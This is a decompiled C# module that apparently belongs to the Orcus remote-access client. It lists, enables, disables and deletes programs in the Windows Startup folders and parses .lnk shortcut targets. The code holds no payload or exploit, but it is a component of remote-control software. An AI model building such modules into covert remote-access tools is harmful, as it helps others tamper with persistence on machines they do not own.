using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Shared.Commands.StartupManager;

namespace Orcus.Commands.StartupManager;

public static class FolderAutostart
{
	public static List<AutostartProgramInfo> GetAutostartProgramsFromFolder(AutostartLocation autostartLocation, bool isEnabled)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		List<AutostartProgramInfo> list = new List<AutostartProgramInfo>();
		try
		{
			DirectoryInfo directoryFromAutostartLocation = GetDirectoryFromAutostartLocation(autostartLocation, isEnabled);
			if (directoryFromAutostartLocation.Exists)
			{
				FileInfo[] files = directoryFromAutostartLocation.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					if (!(fileInfo.Name == "desktop.ini"))
					{
						FileInfo fileInfo2 = ((!(fileInfo.Extension == ".lnk")) ? fileInfo : new FileInfo(GetShortcutTarget(fileInfo.FullName)));
						AutostartProgramInfo val = new AutostartProgramInfo();
						val.set_Name(fileInfo.Name);
						val.set_CommandLine(fileInfo2.FullName);
						val.set_IsEnabled(isEnabled);
						val.set_AutostartLocation(autostartLocation);
						AutostartProgramInfo autostartProgramInfo = val;
						list.Add(AutostartManager.CompleteAutostartProgramInfo(autostartProgramInfo));
					}
				}
				return list;
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static void ChangeAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		if (!isEnabled)
		{
			CreateDisabledFolder(autostartLocation);
		}
		new FileInfo(Path.Combine(GetDirectoryFromAutostartLocation(autostartLocation, !isEnabled).FullName, name)).MoveTo(Path.Combine(GetDirectoryFromAutostartLocation(autostartLocation, isEnabled).FullName, name));
		if (isEnabled)
		{
			DirectoryInfo directoryFromAutostartLocation = GetDirectoryFromAutostartLocation(autostartLocation, isEnabled: false);
			if (directoryFromAutostartLocation.GetFileSystemInfos().Length == 0)
			{
				directoryFromAutostartLocation.Delete(recursive: false);
			}
		}
	}

	public static void RemoveAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		new FileInfo(Path.Combine(GetDirectoryFromAutostartLocation(autostartLocation, isEnabled).FullName, name)).Delete();
		if (!isEnabled)
		{
			DirectoryInfo directoryFromAutostartLocation = GetDirectoryFromAutostartLocation(autostartLocation, isEnabled: false);
			if (directoryFromAutostartLocation.GetFileSystemInfos().Length == 0)
			{
				directoryFromAutostartLocation.Delete(recursive: false);
			}
		}
	}

	private static void CreateDisabledFolder(AutostartLocation autostartLocation)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		DirectoryInfo directoryFromAutostartLocation = GetDirectoryFromAutostartLocation(autostartLocation, isEnabled: false);
		if (!directoryFromAutostartLocation.Exists)
		{
			directoryFromAutostartLocation.Create();
		}
	}

	private static DirectoryInfo GetDirectoryFromAutostartLocation(AutostartLocation autostartLocation, bool isEnabled)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		DirectoryInfo directoryInfo = GetDirectoryFromAutostartLocation(autostartLocation);
		if (!isEnabled)
		{
			directoryInfo = new DirectoryInfo(Path.Combine(directoryInfo.FullName, "AutorunsDisabled"));
		}
		return directoryInfo;
	}

	private static DirectoryInfo GetDirectoryFromAutostartLocation(AutostartLocation autostartLocation)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Invalid comparison between Unknown and I4
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		if ((int)autostartLocation != 100)
		{
			if ((int)autostartLocation != 101)
			{
				throw new ArgumentOutOfRangeException("autostartLocation", autostartLocation, null);
			}
			return new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
		}
		return new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "..\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"));
	}

	private static string GetShortcutTarget(string file)
	{
		try
		{
			if (Path.GetExtension(file)!.ToLower() != ".lnk")
			{
				throw new Exception("Supplied file must be a .LNK file");
			}
			FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read);
			using BinaryReader binaryReader = new BinaryReader(fileStream);
			fileStream.Seek(20L, SeekOrigin.Begin);
			if ((binaryReader.ReadUInt32() & 1) == 1)
			{
				fileStream.Seek(76L, SeekOrigin.Begin);
				uint num = binaryReader.ReadUInt16();
				fileStream.Seek(num, SeekOrigin.Current);
			}
			long position = fileStream.Position;
			uint num2 = binaryReader.ReadUInt32();
			fileStream.Seek(12L, SeekOrigin.Current);
			uint num3 = binaryReader.ReadUInt32();
			fileStream.Seek(position + num3, SeekOrigin.Begin);
			long num4 = num2 + position - fileStream.Position - 2L;
			string text = new string(binaryReader.ReadChars((int)num4));
			int num5 = text.IndexOf("\0\0");
			if (num5 > -1)
			{
				int startIndex = text.IndexOf("\\\\", num5 + 2) + 2;
				startIndex = text.IndexOf('\0', startIndex) + 1;
				string text2 = text.Substring(0, num5);
				string text3 = text.Substring(startIndex);
				return text2 + text3;
			}
			return text;
		}
		catch
		{
			return "";
		}
	}
}
